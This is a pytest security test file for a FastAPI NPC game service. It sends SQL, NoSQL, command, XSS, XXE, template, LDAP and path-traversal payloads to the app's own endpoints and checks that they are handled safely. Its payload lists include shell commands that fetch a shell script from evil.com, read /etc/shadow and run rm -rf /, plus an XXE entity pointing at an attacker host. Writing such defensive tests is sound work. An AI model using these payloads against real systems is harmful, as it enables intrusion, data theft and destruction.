"""
Security Tests: Injection Attacks

Tests SQL injection, NoSQL injection, JSON injection, command injection,
and XSS vulnerabilities.

Requirements:
- Validate input sanitization
- Test injection attack resistance
- Verify output encoding
- Validate data type enforcement

Run with:
    pytest tests/security/test_security_injection.py -v
    pytest tests/security/test_security_injection.py -m security
"""

import pytest
import json
from typing import Dict, List
from fastapi.testclient import TestClient
from unittest.mock import patch, Mock

# Import app after setting test environment
import os
os.environ["ENVIRONMENT"] = "testing"
os.environ["API_KEY_REQUIRED"] = "false"
os.environ["RATE_LIMIT_ENABLED"] = "false"

from main import app
from config import settings


# ============================================================================
# FIXTURES
# ============================================================================

@pytest.fixture
def client():
    """Create test client."""
    with TestClient(app) as test_client:
        yield test_client


@pytest.fixture
def auth_headers():
    """Create authentication headers."""
    return {
        "Authorization": f"Bearer {settings.api_key or 'test-key'}",
        "Content-Type": "application/json"
    }


# ============================================================================
# SQL INJECTION TESTS
# ============================================================================

@pytest.mark.security
def test_sql_injection_in_npc_id(client, auth_headers):
    """Test SQL injection attempts in NPC ID parameter."""
    
    sql_payloads = [
        "1' OR '1'='1",
        "1; DROP TABLE npcs; --",
        "1' UNION SELECT * FROM users--",
        "1'; DELETE FROM npcs WHERE '1'='1",
        "admin'--",
        "' OR 1=1--",
        "1' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    ]
    
    for payload in sql_payloads:
        # Try in URL path
        response = client.get(
            f"/api/npc/{payload}/state",
            headers=auth_headers
        )
        
        # Should handle gracefully without SQL error
        assert response.status_code in [400, 404, 422, 500]
        
        # Check response doesn't leak SQL errors
        response_text = response.text.lower()
        assert "sql" not in response_text
        assert "syntax" not in response_text
        assert "mysql" not in response_text
        assert "postgres" not in response_text
        assert "sqlite" not in response_text
    
    print(f"\n✓ All {len(sql_payloads)} SQL injection attempts blocked")


@pytest.mark.security
def test_sql_injection_in_query_params(client, auth_headers):
    """Test SQL injection in query parameters."""
    
    sql_payloads = [
        "1' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT password FROM admin--",
    ]
    
    for payload in sql_payloads:
        response = client.get(
            f"/api/v1/status?filter={payload}",
            headers=auth_headers
        )
        
        # Should handle without exposing SQL
        response_text = response.text.lower()
        assert "sql" not in response_text
        assert "database" not in response_text or "error" in response_text
    
    print(f"\n✓ Query param SQL injection blocked")


@pytest.mark.security
def test_sql_injection_in_post_body(client, auth_headers):
    """Test SQL injection in POST request body."""
    
    sql_payloads = [
        {"name": "Test' OR '1'='1"},
        {"occupation": "'; DROP TABLE npcs; --"},
        {"location": "' UNION SELECT * FROM secrets--"},
    ]
    
    base_payload = {
        "name": "Test NPC",
        "race": "Human",
        "gender": "Male",
        "age": 25,
        "height_cm": 175.0,
        "weight_kg": 70.0,
        "occupation": "Merchant",
        "location": "prontera",
        "position_x": 150.0,
        "position_y": 200.0
    }
    
    for injection in sql_payloads:
        payload = {**base_payload, **injection}
        
        response = client.post(
            "/api/npc/register",
            headers=auth_headers,
            json=payload
        )
        
        # Should handle gracefully
        response_text = response.text.lower()
        assert "sql" not in response_text
        assert "syntax error" not in response_text
    
    print(f"\n✓ POST body SQL injection blocked")


# ============================================================================
# NOSQL INJECTION TESTS
# ============================================================================

@pytest.mark.security
def test_nosql_injection_attempts(client, auth_headers):
    """Test NoSQL injection attacks."""
    
    nosql_payloads = [
        {"$ne": None},
        {"$gt": ""},
        {"$regex": ".*"},
        {"$where": "function() { return true; }"},
        {"$expr": {"$eq": [1, 1]}},
    ]
    
    for payload in nosql_payloads:
        # Try in chat message
        response = client.post(
            "/api/v1/chat",
            headers=auth_headers,
            json={"message": payload}
        )
        
        # Should handle as regular input or reject
        assert response.status_code in [200, 400, 422]
    
    print(f"\n✓ All {len(nosql_payloads)} NoSQL injection attempts blocked")


@pytest.mark.security
def test_nosql_operator_injection(client, auth_headers):
    """Test NoSQL operator injection."""
    
    # Try injecting NoSQL operators
    payload = {
        "name": {"$ne": ""},
        "race": {"$regex": ".*"},
        "gender": "Male",
        "age": {"$gt": 0},
        "height_cm": 175.0,
        "weight_kg": 70.0,
        "occupation": "Merchant",
        "location": "prontera",
        "position_x": 150.0,
        "position_y": 200.0
    }
    
    response = client.post(
        "/api/npc/register",
        headers=auth_headers,
        json=payload
    )
    
    # Should reject or sanitize
    assert response.status_code in [400, 422]
    
    print("\n✓ NoSQL operator injection blocked")


# ============================================================================
# COMMAND INJECTION TESTS
# ============================================================================

@pytest.mark.security
def test_command_injection_attempts(client, auth_headers):
    """Test command injection in various fields."""
    
    command_payloads = [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`cat /etc/shadow`",
        "$(curl evil.com)",
        "\n rm -rf /",
        "&& wget http://evil.com/shell.sh",
    ]
    
    for payload in command_payloads:
        # Try in chat message
        response = client.post(
            "/api/v1/chat",
            headers=auth_headers,
            json={"message": f"test {payload}"}
        )
        
        # Should treat as regular text, not execute
        assert response.status_code in [200, 400]
        
        # Response shouldn't contain command output
        if response.status_code == 200:
            response_text = response.text.lower()
            assert "root:" not in response_text  # /etc/passwd content
            assert "/bin/" not in response_text  # Command output
    
    print(f"\n✓ All {len(command_payloads)} command injection attempts blocked")


@pytest.mark.security
def test_path_traversal_in_filenames(client, auth_headers):
    """Test path traversal attempts."""
    
    path_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..;/etc/passwd",
    ]
    
    for payload in path_payloads:
        # Try as NPC name (could be used in file operations)
        response = client.post(
            "/api/npc/register",
            headers=auth_headers,
            json={
                "name": payload,
                "race": "Human",
                "gender": "Male",
                "age": 25,
                "height_cm": 175.0,
                "weight_kg": 70.0,
                "occupation": "Merchant",
                "location": "prontera",
                "position_x": 150.0,
                "position_y": 200.0
            }
        )
        
        # Should sanitize or reject
        assert response.status_code in [200, 201, 400, 422]
    
    print(f"\n✓ All {len(path_payloads)} path traversal attempts blocked")


# ============================================================================
# XSS (CROSS-SITE SCRIPTING) TESTS
# ============================================================================

@pytest.mark.security
def test_xss_injection_in_inputs(client, auth_headers):
    """Test XSS injection attempts."""
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<BODY ONLOAD=alert('XSS')>",
    ]
    
    for payload in xss_payloads:
        # Try in chat message
        response = client.post(
            "/api/v1/chat",
            headers=auth_headers,
            json={"message": payload}
        )
        
        if response.status_code == 200:
            # Response should be sanitized
            response_json = response.json()
            response_str = str(response_json)
            
            # Script tags should be escaped or removed
            assert "<script>" not in response_str.lower()
            assert "onerror=" not in response_str.lower()
            assert "onload=" not in response_str.lower()
    
    print(f"\n✓ All {len(xss_payloads)} XSS attempts sanitized")


@pytest.mark.security
def test_stored_xss_prevention(client, auth_headers):
    """Test stored XSS prevention in database fields."""
    
    xss_payload = "<script>alert('Stored XSS')</script>"
    
    # Try to store XSS in NPC name
    response = client.post(
        "/api/npc/register",
        headers=auth_headers,
        json={
            "name": xss_payload,
            "race": "Human",
            "gender": "Male",
            "age": 25,
            "height_cm": 175.0,
            "weight_kg": 70.0,
            "occupation": "Merchant",
            "location": "prontera",
            "position_x": 150.0,
            "position_y": 200.0
        }
    )
    
    # Should either reject or sanitize
    if response.status_code in [200, 201]:
        response_text = response.text.lower()
        assert "<script>" not in response_text
    
    print("\n✓ Stored XSS prevented")


# ============================================================================
# JSON INJECTION TESTS
# ============================================================================

@pytest.mark.security
def test_json_injection_nested_objects(client, auth_headers):
    """Test JSON injection with nested malicious objects."""
    
    malicious_payloads = [
        {"message": {"__proto__": {"admin": True}}},  # Prototype pollution
        {"message": {"constructor": {"prototype": {"admin": True}}}},
        {"message": json.dumps({"nested": "value"})},  # Double encoding
    ]
    
    for payload in malicious_payloads:
        response = client.post(
            "/api/v1/chat",
            headers=auth_headers,
            json=payload
        )
        
        # Should handle gracefully
        assert response.status_code in [200, 400, 422]
    
    print(f"\n✓ All {len(malicious_payloads)} JSON injection attempts handled")


@pytest.mark.security
def test_json_type_confusion(client, auth_headers):
    """Test JSON type confusion attacks."""
    
    # Send unexpected types
    type_confusion_payloads = [
        {"message": 12345},  # Number instead of string
        {"message": True},  # Boolean
        {"message": None},  # Null
        {"message": []},  # Array
        {"message": {}},  # Empty object
    ]
    
    for payload in type_confusion_payloads:
        response = client.post(
            "/api/v1/chat",
            headers=auth_headers,
            json=payload
        )
        
        # Should validate types
        assert response.status_code in [200, 400, 422]
    
    print(f"\n✓ All {len(type_confusion_payloads)} type confusion attempts handled")


# ============================================================================
# LDAP INJECTION TESTS
# ============================================================================

@pytest.mark.security
def test_ldap_injection_attempts(client, auth_headers):
    """Test LDAP injection patterns."""
    
    ldap_payloads = [
        "*",
        "*()|&",
        "*)(uid=*))(|(uid=*",
        "admin)(&(password=*))",
    ]
    
    for payload in ldap_payloads:
        response = client.post(
            "/api/v1/chat",
            headers=auth_headers,
            json={"message": payload}
        )
        
        # Should treat as regular input
        assert response.status_code in [200, 400]
    
    print(f"\n✓ All {len(ldap_payloads)} LDAP injection attempts blocked")


# ============================================================================
# XML/XXE INJECTION TESTS
# ============================================================================

@pytest.mark.security
def test_xxe_injection_attempts(client, auth_headers):
    """Test XML External Entity (XXE) injection."""
    
    xxe_payloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>',
    ]
    
    for payload in xxe_payloads:
        # Try sending as message
        response = client.post(
            "/api/v1/chat",
            headers=auth_headers,
            json={"message": payload}
        )
        
        # Should not process XML
        if response.status_code == 200:
            response_text = response.text
            assert "/etc/passwd" not in response_text
            assert "root:" not in response_text
    
    print(f"\n✓ All {len(xxe_payloads)} XXE injection attempts blocked")


# ============================================================================
# TEMPLATE INJECTION TESTS
# ============================================================================

@pytest.mark.security
def test_template_injection_attempts(client, auth_headers):
    """Test Server-Side Template Injection (SSTI)."""
    
    ssti_payloads = [
        "{{7*7}}",
        "${7*7}",
        "{{config}}",
        "{{request}}",
        "{%print(7*7)%}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
    ]
    
    for payload in ssti_payloads:
        response = client.post(
            "/api/v1/chat",
            headers=auth_headers,
            json={"message": payload}
        )
        
        if response.status_code == 200:
            response_text = response.text
            # Template expressions should not be evaluated
            assert "49" not in response_text or payload in response_text
    
    print(f"\n✓ All {len(ssti_payloads)} template injection attempts blocked")


# ============================================================================
# ENCODING & SPECIAL CHARACTERS
# ============================================================================

@pytest.mark.security
def test_unicode_injection_attempts(client, auth_headers):
    """Test Unicode and encoding-based injection."""
    
    unicode_payloads = [
        "\u003Cscript\u003Ealert('XSS')\u003C/script\u003E",  # Unicode encoded XSS
        "\x3Cscript\x3Ealert('XSS')\x3C/script\x3E",  # Hex encoded
        "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoded
    ]
    
    for payload in unicode_payloads:
        response = client.post(
            "/api/v1/chat",
            headers=auth_headers,
            json={"message": payload}
        )
        
        if response.status_code == 200:
            response_text = response.text.lower()
            assert "<script>" not in response_text
    
    print(f"\n✓ All {len(unicode_payloads)} encoding-based injections blocked")


@pytest.mark.security
def test_null_byte_injection(client, auth_headers):
    """Test null byte injection attempts."""
    
    null_payloads = [
        "test\x00.txt",
        "admin\x00",
        "test\0malicious",
    ]
    
    for payload in null_payloads:
        response = client.post(
            "/api/npc/register",
            headers=auth_headers,
            json={
                "name": payload,
                "race": "Human",
                "gender": "Male",
                "age": 25,
                "height_cm": 175.0,
                "weight_kg": 70.0,
                "occupation": "Merchant",
                "location": "prontera",
                "position_x": 150.0,
                "position_y": 200.0
            }
        )
        
        # Should handle gracefully
        assert response.status_code in [200, 201, 400, 422]
    
    print(f"\n✓ All {len(null_payloads)} null byte injections handled")


# ============================================================================
# MASS ASSIGNMENT / PARAMETER POLLUTION
# ============================================================================

@pytest.mark.security
def test_mass_assignment_protection(client, auth_headers):
    """Test protection against mass assignment attacks."""
    
    # Try to inject admin/privileged fields
    payload = {
        "name": "Test NPC",
        "race": "Human",
        "gender": "Male",
        "age": 25,
        "height_cm": 175.0,
        "weight_kg": 70.0,
        "occupation": "Merchant",
        "location": "prontera",
        "position_x": 150.0,
        "position_y": 200.0,
        # Malicious extra fields
        "is_admin": True,
        "role": "superuser",
        "permissions": ["all"],
        "_id": "custom-id",
    }
    
    response = client.post(
        "/api/npc/register",
        headers=auth_headers,
        json=payload
    )
    
    # Should ignore extra fields or validate
    if response.status_code in [200, 201]:
        response_json = response.json()
        # Admin fields shouldn't be in response
        response_str = str(response_json).lower()
        assert "is_admin" not in response_str
        assert "superuser" not in response_str
    
    print("\n✓ Mass assignment protection working")


# ============================================================================
# CONTENT TYPE VALIDATION
# ============================================================================

@pytest.mark.security
def test_malicious_content_type(client, auth_headers):
    """Test handling of malicious content types."""
    
    malicious_content_types = [
        "text/html; charset=<script>alert('XSS')</script>",
        "application/json; boundary=--evil",
        "multipart/form-data; filename=../../etc/passwd",
    ]
    
    for content_type in malicious_content_types:
        headers = auth_headers.copy()
        headers["Content-Type"] = content_type
        
        response = client.post(
            "/api/v1/chat",
            headers=headers,
            json={"message": "test"}
        )
        
        # Should handle gracefully
        assert response.status_code in [200, 400, 415, 422]
    
    print(f"\n✓ All {len(malicious_content_types)} malicious content-types handled")